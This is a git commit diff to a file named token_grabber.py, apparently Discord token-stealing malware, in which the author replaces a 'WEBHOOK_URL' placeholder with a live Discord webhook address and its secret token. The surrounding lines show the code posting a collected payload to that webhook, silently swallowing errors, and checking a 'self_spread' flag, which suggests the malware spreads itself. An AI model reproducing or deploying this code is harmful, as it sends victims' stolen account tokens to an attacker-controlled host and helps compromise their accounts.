f99d5fd08742bea6663d811db14e146ecfcc092d
AveCool <79378189+ave-cool@users.noreply.github.com>
2023-08-15 19:44:07 +0400

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1141034556867235860/jLOBPJGjIdf5BVCdIL15Kzq-6IrEi5ycqiF4uhgOTkn_ij2qDOc7oaBCYZN4RuvCuODK", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
